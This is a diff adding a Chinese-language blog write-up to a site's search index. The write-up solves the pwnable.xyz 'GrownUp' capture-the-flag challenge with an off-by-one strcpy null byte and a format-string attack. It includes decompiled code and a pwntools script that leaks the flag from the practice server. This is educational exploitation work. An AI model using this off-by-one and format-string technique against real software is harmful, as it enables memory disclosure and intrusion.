@@ -1608,4 +1608,60 @@
         <tag>PWN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>GrownUp</title>
+    <url>/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/</url>
+    <content><![CDATA[<p><strong></strong></p>
+ <a id="more"></a>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/11.png" class></strong></p>
+<h3 id="检查文件保护措施"><a class="markdownIt-Anchor" href="#检查文件保护措施"></a> 检查文件保护措施</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/1.png" class></strong></p>
+<h3 id="ida64打开文件"><a class="markdownIt-Anchor" href="#ida64打开文件"></a> IDA64打开文件</h3>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *src; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup();</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you 18 years or older? [y/N]: &quot;</span>, argv);</span><br><span class="line">  *(&amp;buf + (read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL) - <span class="number">1</span>)) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( buf != <span class="number">121</span> &amp;&amp; buf != <span class="number">89</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  src = <span class="built_in">malloc</span>(<span class="number">0x84</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: &quot;</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(usr, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>, src);</span><br><span class="line">  <span class="built_in">printf</span>(qword_601160, usr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="程序的执行逻辑如下"><a class="markdownIt-Anchor" href="#程序的执行逻辑如下"></a> 程序的执行逻辑如下：</h4>
+<p>1、用户输入y/N，如果输入为<code>y/Y</code>(其对应的ASCII码为121和89)，则程序继续执行否则退出。</p>
+<p>2、给src分配0x84字节的空间，并从用户输入中读取0x80字节的数据。</p>
+<p>3、之后执行<code>strcpy</code>函数，将src中的内容复制到usr中。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/3.png" class></strong></p>
+<p>注意<code>strcpy</code>会在字符串末尾加零，因此实际传入为<code>0x81</code>字节。</p>
+<h5 id="可以简单做个实验"><a class="markdownIt-Anchor" href="#可以简单做个实验"></a> 可以简单做个实验：</h5>
+<p>先使用gdb调试找到strcpy函数写入的内存地址：<br>
+<strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/4.png" class></strong></p>
+<p>调用strcpy函数之前查看内存情况：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/5.png" class></strong></p>
+<p>借助python向其中写入128个字符（之前都是0无法观察），观察之后内存中的数值：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/6.png" class></strong></p>
+<p>调用strcpy函数之后，可以观察到在输入的128字符的末尾将原先的<code>68</code>覆盖为了<code>00</code>：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/7.png" class></strong></p>
+<p>4、之后调用printf函数打印usr的值，但第一个参数<code>qword_601160</code>感觉很奇怪：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  qword_601160 = &amp;byte_601168;</span><br><span class="line">  byte_601168 = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">  byte_601169 = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  byte_60116A = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x3C</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里将&amp;byte_601168写入qword_601160中，地址中写入<code>%s\n</code>（注意对数字要敏感，经常对应着ASCII码的值），这样看printf函数是根据bss段中601168地址中的参数打印usr。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/8.png" class></strong></p>
+<p>5、查找可疑的字符串</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/2.png" class></strong></p>
+<p>可见Flag被存放在二进制文件中</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/D:%5CXiaohong_Blog%5Cblog%5Csource_posts%5CPWN%5CPwnable_xyz%5CGrownUp%5C9.png" alt="image-20201114142751543"></p>
+<h3 id="梳理解题思路"><a class="markdownIt-Anchor" href="#梳理解题思路"></a> 梳理解题思路</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/10.png" class></strong></p>
+<p>参考上图，解题的思路如下：</p>
+<p>本来printf函数是将地址0x601168地址中的值作为参数，但由于strcpy函数复制用户输入的0x80字节数据到usr中，实际为0x81字节，而<code>0x6010E0-0x601160 = 0x80</code>，多出来的NULL字符会将0x601168改写为0x601100，而0x601100是在usr的范围内（<code>0x601100-0x6010E0 = 0x20 = 32Byte</code>)，因此用户可以通过输入格式化字符填充这块区域，打印出需要的flag的值，其中flag的地址为0x601080（<code>地址固定，因为未开启PIE</code>)。注意格式化字符串打印时，是在栈上寻找对应的参数，因此我们需要在栈上放置flag的地址，但是用户的输入只会填充到BSS段，如何在栈上放置地址呢？</p>
+<p>观察程序在一开始输入<code>Y/N</code>时，<code>read(0, &amp;buf, 0x10uLL)</code>读取了用户输入的16字节，而只验证用户输入的第一个字节，因此可以用来传入Flag的地址。</p>
+<h4 id="寻找格式化参数在栈上的位置"><a class="markdownIt-Anchor" href="#寻找格式化参数在栈上的位置"></a> 寻找格式化参数在栈上的位置</h4>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/12.png" class></strong></p>
+<p>输入的前8个字节为格式化字符串的第8个参数，因此首先需要填充8个格式化字符，填充%p，若填充%s可能导致非法内存的访问。</p>
+<h5 id="填充字符的输入使用python"><a class="markdownIt-Anchor" href="#填充字符的输入使用python"></a> 填充字符的输入使用python</h5>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/13.png" class></strong></p>
+<h3 id="编写python脚本"><a class="markdownIt-Anchor" href="#编写python脚本"></a> 编写python脚本</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">&#x27;./GrownUpRedist&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;svc.pwnable.xyz&quot;</span>, <span class="number">30004</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x601080</span></span><br><span class="line">fmtstr_addr = <span class="number">0x601160</span></span><br><span class="line">usr_addr = <span class="number">0x6010E0</span></span><br><span class="line">target_addr = <span class="number">0x601100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充的y为8字节对齐</span></span><br><span class="line">payload1 = <span class="string">b&quot;y&quot;</span>*<span class="number">8</span> + p64(flag_addr)</span><br><span class="line">io.sendafter(<span class="string">&quot;Are you 18 years or older? [y/N]: &quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&quot;%p&quot;</span>*<span class="number">8</span> + <span class="string">b&quot;%s&quot;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x80</span>, <span class="string">b&quot;b&quot;</span>) </span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/11/14/PWN/Pwnable_xyz/GrownUp/14.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.xyz</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
 </search>
